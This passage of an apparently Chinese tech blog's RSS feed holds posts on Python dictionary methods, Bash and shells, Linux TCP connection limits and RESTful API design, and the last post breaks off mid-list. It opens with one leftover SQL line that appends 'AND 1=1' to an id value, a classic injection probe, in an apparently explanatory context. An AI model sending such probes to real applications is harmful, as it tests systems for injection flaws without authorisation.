&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; articles &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—字典取值</title>
        <link>https://ac-lm.github.io/posts/python/python%E5%AD%97%E5%85%B8%E5%8F%96%E5%80%BC/</link>
        <pubDate>Thu, 10 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E5%AD%97%E5%85%B8%E5%8F%96%E5%80%BC/</guid>
        <description>&lt;h2 id=&#34;1取键keys&#34;&gt;1.取键：keys()&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;bb&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;人才/可怕&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;伏地魔&amp;amp;波特&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;army&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;哈哈哈,人才,回合&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hhh&amp;#39;&lt;/span&gt;}
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ii &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; bb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys():
    print(ii)
&lt;span style=&#34;color:#75715e&#34;&gt;#--输出-------------------------------------------------------------------------&lt;/span&gt;
人才&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;可怕
伏地魔&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;波特
哈哈哈,人才,回合
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2取值values&#34;&gt;2.取值：values()&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; jj &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; bb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values():
    print(jj)
&lt;span style=&#34;color:#75715e&#34;&gt;#--输出-------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;
army
hhh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4取-键值-对items&#34;&gt;4.取 键.值 对：items()&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; kk,vv &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; bb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;items():
    print(kk, vv)
&lt;span style=&#34;color:#75715e&#34;&gt;#---输出------------------------------------------------------------------------&lt;/span&gt;
人才&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;可怕 &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;
伏地魔&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;波特 army
哈哈哈,人才,回合 hhh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5获取指定键的值&#34;&gt;5.获取指定键的值&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;人才&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;没有找到该键&amp;#39;&lt;/span&gt;)
print(c)
cc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;人才/可怕&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;没有找到该键&amp;#39;&lt;/span&gt;)
print(cc)
&lt;span style=&#34;color:#75715e&#34;&gt;#----输出------------------------------------------------------------------------&lt;/span&gt;
没有找到该键
&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6获取值并且pop出这一键值对&#34;&gt;6.获取值，并且pop出这一键值对&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pop(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;人才&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pop失败&amp;#39;&lt;/span&gt;)  
print(d)
dd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pop(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;人才/可怕&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pop失败&amp;#39;&lt;/span&gt;)  
print(dd)
print(bb) 
&lt;span style=&#34;color:#75715e&#34;&gt;#----输出-----------------------------------------------------------------------&lt;/span&gt;
pop失败
&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—什么是 Bash Shell</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-bash-shell/</link>
        <pubDate>Wed, 09 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-bash-shell/</guid>
        <description>&lt;h2 id=&#34;1什么是bash&#34;&gt;1.什么是Bash&lt;/h2&gt;
&lt;p&gt;Bash是Unix shell的一种，运行于大多数类Unix系统的操作系统之上，Linux与Mac OS都将它作为默认shell。&lt;/p&gt;
&lt;p&gt;此外Bash是一个命令处理器，通常运行于文本窗口中，并能执行用户直接输入的命令。Bash还能从文件中读取命令。&lt;/p&gt;
&lt;h2 id=&#34;2什么是shell&#34;&gt;2.什么是Shell&lt;/h2&gt;
&lt;p&gt;在计算机科学中，&lt;strong&gt;Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）&lt;/strong&gt;。它接收用户命令，然后调用相应的应用程序。&lt;/p&gt;
&lt;p&gt;同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。&lt;/p&gt;
&lt;p&gt;Shell是操作系统最外面的一层，是文字操作系统与外部最主要的接口，Shell管理你与操作系统之间的交互：等待你输入，向操作系统解释你的输入，并且处理各种各样的操作系统的输出结果。&lt;/p&gt;
&lt;h2 id=&#34;3shell的两大类&#34;&gt;3.Shell的两大类&lt;/h2&gt;
&lt;h3 id=&#34;一图形界面shellgraphical-user-interface-shell-即-gui-shell&#34;&gt;一：图形界面shell（Graphical User Interface shell 即 GUI shell）&lt;/h3&gt;
&lt;p&gt;例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。&lt;/p&gt;
&lt;h3 id=&#34;二命令行式shellcommand-line-interface-shell-即cli-shell&#34;&gt;二：命令行式shell（Command Line Interface shell ，即CLI shell）&lt;/h3&gt;
&lt;p&gt;例如：bash / sh / ksh / csh / zsh（Unix/linux 系统）（MS-DOS系统），cmd.exe / 命令提示字符（Windows NT 系统），Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）&lt;/p&gt;
&lt;h3 id=&#34;三主流的shell&#34;&gt;三：主流的Shell&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Bourne Shell&lt;/strong&gt;：首个重要的标准Unix Shell，是UNIX 最初使用的 shell，并且在每种 UNIX 上都可以使用, 在 shell 编程方面相当优秀，但在处理与用户的交互方面做得不如其他几种Shell&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;C Shell&lt;/strong&gt;：首个交互式功能Shell，并把ALGOL风格的语法结构变成了C语言风格&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Korn Shell&lt;/strong&gt;：ksh结合了所有的C shell的交互式特性，并融入了Bourne shell的语法（Bourne shell用来编程，C shell用来交互）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Bourne Again Shell (bash)&lt;/strong&gt;：替代Bourne shell&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;POSIX Shell&lt;/strong&gt;：Korn shell的一个变种，主要为hp(惠普)提供&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4交互式shell和非交互式shell&#34;&gt;4.交互式shell和非交互式Shell&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;交互式Shell&lt;/strong&gt;：就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;非交互式Shell&lt;/strong&gt;：在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5linux的shell&#34;&gt;5.Linux的Shell&lt;/h2&gt;
&lt;p&gt;Linux 操作系统&lt;strong&gt;缺省（默认）的Shell 是Bourne Again shell&lt;/strong&gt;，它是 Bourne shell 的扩展，简称&lt;strong&gt;Bash&lt;/strong&gt;，与 Bourne shell 完全向后兼容，并且在Bourne shell 的基础上增加、增强了很多特性。Bash放在/bin/bash中，它有许多特色，可以提供如命令补全、命令编辑和命令历史表等功能，它还包含了很多 C shell 和 Korn shell 中的优点，有灵活和强大的编程接口，同时又有很友好的用户界面。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>随记—Linux 最多支持多少 TCP 连接</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0linux-%E6%9C%80%E5%A4%9A%E6%94%AF%E6%8C%81%E5%A4%9A%E5%B0%91-tcp-%E8%BF%9E%E6%8E%A5/</link>
        <pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0linux-%E6%9C%80%E5%A4%9A%E6%94%AF%E6%8C%81%E5%A4%9A%E5%B0%91-tcp-%E8%BF%9E%E6%8E%A5/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/J0Abwz20IO9N0NxooSEKXQ&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 一台Linux服务器最多能支撑多少个TCP连接？ @PHP饭米粒 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1并发问题&#34;&gt;1.并发问题&lt;/h2&gt;
&lt;p&gt;在网络开发中，有这样一个基础问题始终没有彻底搞明白。那就是一台服务器最大究竟能支持多少个网络连接？&lt;/p&gt;
&lt;p&gt;很多同学看到这个问题的第一反应是65535。原因是：“听说端口号最多有65535个，那长连接就最多保持65535个了”。是这样的吗？还有的人说：“应该受TCP连接里四元组的空间大小限制，算起来是200多万亿个！”&lt;/p&gt;
&lt;h2 id=&#34;2一次关于服务器端并发的聊天&#34;&gt;2.一次关于服务器端并发的聊天&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291725751.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291725751.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;TCP连接四元组是源IP地址、源端口、目的IP地址和目的端口。任意一个元素发生了改变，那么就代表的是一条完全不同的连接了。拿我的Nginx举例，它的端口是固定使用80。另外我的IP也是固定的，这样目的IP地址、目的端口都是固定的。剩下源IP地址、源端口是可变的。所以理论上我的Nginx上最多可以建立2的32次方（ip数）×2的16次方（port数）个连接。这是两百多万亿的一个大数字！！&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291725794.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291725794.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;进程每打开一个文件（linux下一切皆文件，包括socket），都会消耗一定的内存资源。如果有不怀好心的人启动一个进程来无限的创建和打开新的文件，会让服务器崩溃。所以linux系统出于安全角度的考虑，在多个位置都限制了可打开的文件描述符的数量，包括系统级、用户级、进程级。这三个限制的含义和修改方式如下：&amp;rdquo;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统级：当前系统可打开的最大数量，通过fs.file-max参数可修改&lt;/li&gt;
&lt;li&gt;用户级：指定用户可打开的最大数量，修改/etc/security/limits.conf&lt;/li&gt;
&lt;li&gt;进程级：单个进程可打开的最大数量，通过fs.nr_open参数可修改&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291725123.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291725123.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;我的接收缓存区大小是可以配置的，通过sysctl命令就可以查看。&amp;rdquo;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sysctl -a | grep rmem
net.ipv4.tcp_rmem = 4096 87380 8388608
net.core.rmem_default = 212992
net.core.rmem_max = 8388608
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&amp;ldquo;其中在tcp_rmem&amp;quot;中的第一个值是为你们的TCP连接所需分配的最少字节数。该值默认是4K，最大的话8MB之多。也就是说你们有数据发送的时候我需要至少为对应的socket再分配4K内存，甚至可能更大。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291726583.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291726583.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;TCP分配发送缓存区的大小受参数net.ipv4.tcp_wmem配置影响。&amp;rdquo;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sysctl -a | grep wmem
net.ipv4.tcp_wmem = 4096 65536 8388608
net.core.wmem_default = 212992
net.core.wmem_max = 8388608
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&amp;ldquo;在net.ipv4.tcp_wmem&amp;quot;中的第一个值是发送缓存区的最小值，默认也是4K。当然了如果数据很大的话，该缓存区实际分配的也会比默认值大。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291727119.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291727119.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;3服务器百万连接达成记&#34;&gt;3.服务器百万连接达成记&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291727222.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291727222.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;“准备啥呢，还记得前面说过Linux对最大文件对象数量有限制，所以要想完成这个实验，得在用户级、系统级、进程级等位置把这个上限加大。我们实验目的是100W，这里都设置成110W，这个很重要！因为得保证做实验的时候其它基础命令例如ps，vi等是可用的。“&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291727965.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291727965.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291727038.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291727038.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;活动连接数量确实达到了100W：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ss -n | grep ESTAB | wc -l  
1000024
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当前机器内存总共是3.9GB，其中内核Slab占用了3.2GB之多。MemFree和Buffers加起来也只剩下100多MB了：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cat /proc/meminfo
MemTotal:        3922956 kB
MemFree:           96652 kB
MemAvailable:       6448 kB
Buffers:           44396 kB
......
Slab:          3241244KB kB
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过slabtop命令可以查看到densty、flip、sock_inode_cache、TCP四个内核对象都分别有100W个：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291728743.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291728743.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291728892.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291728892.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>随记—什么是 RESTful API</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-restful-api/</link>
        <pubDate>Sun, 06 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-restful-api/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;原文参考：&lt;a class=&#34;link&#34; href=&#34;http://www.ruanyifeng.com/blog/2014/05/restful_api.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; RESTful API 设计指南  @阮一峰 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1api-接口的产生&#34;&gt;1.API 接口的产生&lt;/h2&gt;
&lt;p&gt;网络应用程序，分为前端和后端两个部分。当前的发展趋势，就是前端设备层出不穷（手机、平板、桌面电脑、其他专用设备&amp;hellip;&amp;hellip;）。因此，必须有一种统一的机制，方便不同的前端设备与后端进行通信。这导致API构架的流行，甚至出现 API First 的设计思想。RESTful API 是目前比较成熟的一套互联网应用程序的API设计理论。&lt;/p&gt;
&lt;h2 id=&#34;2api-应部署在域名下&#34;&gt;2.API 应部署在域名下&lt;/h2&gt;
&lt;p&gt;应该尽量将API部署在专用域名之下。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://api.example.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://example.org/api/
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3api-版本应放在url中&#34;&gt;3.API 版本应放在URL中&lt;/h2&gt;
&lt;p&gt;应该将API的版本号放入URL。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://api.example.com/v1/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另一种做法是，将版本号放在HTTP头信息中，但不如放入URL方便和直观。Github 采用这种做法。&lt;/p&gt;
&lt;h2 id=&#34;4api-的路径&#34;&gt;4.API 的路径&lt;/h2&gt;
&lt;p&gt;路径又称&amp;quot;终点&amp;quot;（endpoint），表示API的具体网址。&lt;/p&gt;
&lt;p&gt;在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的&amp;quot;集合&amp;quot;（collection），所以API中的名词也应该使用复数。&lt;/p&gt;
&lt;p&gt;举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://api.example.com/v1/zoos&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://api.example.com/v1/zoos&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://api.example.com/v1/animals&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://api.example.com/v1/animals&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://api.example.com/v1/employees&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://api.example.com/v1/employees&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5http-动词-资源请求&#34;&gt;5.HTTP 动词-资源请求&lt;/h2&gt;
&lt;p&gt;常用的HTTP动词有下面五个（括号里是对应的SQL命令）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GET（SELECT）：从服务器取出资源（一项或多项）。&lt;/li&gt;
&lt;li&gt;POST（CREATE）：在服务器新建一个资源。&lt;/li&gt;
&lt;li&gt;PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。&lt;/li&gt;
&lt;li&gt;PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。&lt;/li&gt;
&lt;li&gt;DELETE（DELETE）：从服务器删除资源。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;还有两个不常用的HTTP动词。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HEAD：获取资源的元数据。&lt;/li&gt;
&lt;li&gt;OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面是一些例子。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;GET /zoos：列出所有动物园&lt;/li&gt;
&lt;li&gt;POST /zoos：新建一个动物园&lt;/li&gt;
&lt;li&gt;GET /zoos/ID：获取某个指定动物园的信息&lt;/li&gt;
&lt;li&gt;PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息）&lt;/li&gt;
&lt;li&gt;PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）&lt;/li&gt;
&lt;li&gt;DELETE /zoos/ID：删除某个动物园&lt;/li&gt;
&lt;li&gt;GET /zoos/ID/animals：列出某个指定动物园的所有动物&lt;/li&gt;
&lt;li&gt;DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6过滤信息filtering&#34;&gt;6.过滤信息（Filtering）&lt;/h2&gt;
&lt;p&gt;如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。&lt;/p&gt;
&lt;p&gt;下面是一些常见的参数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;?limit=10：指定返回记录的数量&lt;/li&gt;
&lt;li&gt;?offset=10：指定返回记录的开始位置。&lt;/li&gt;
&lt;li&gt;?page=2&amp;amp;per_page=100：指定第几页，以及每页的记录数。&lt;/li&gt;
&lt;li&gt;?sortby=name&amp;amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。&lt;/li&gt;
&lt;li&gt;?animal_type_id=1：指定筛选条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。&lt;/p&gt;
&lt;h2 id=&#34;7状态码status-codes&#34;&gt;7.状态码（Status Codes）&lt;/h2&gt;
&lt;p&gt;服务器向用户返回的状态码和提示信息，常见的有以下一些（方括号中是该状态码对应的HTTP动词）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。&lt;/li&gt;
&lt;li&gt;201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。&lt;/li&gt;
&lt;li&gt;202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）&lt;/li&gt;
&lt;li&gt;204 NO CONTENT - [DELETE]：用户删除数据成功。&lt;/li&gt;
&lt;li&gt;400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。&lt;/li&gt;
&lt;li&gt;401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。&lt;/li&gt;
&lt;li&gt;403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。&lt;/li&gt;
&lt;li&gt;404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。&lt;/li&gt;
&lt;li&gt;406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。&lt;/li&gt;
&lt;li&gt;410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。&lt;/li&gt;
&lt;li&gt;422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。&lt;/li&gt;
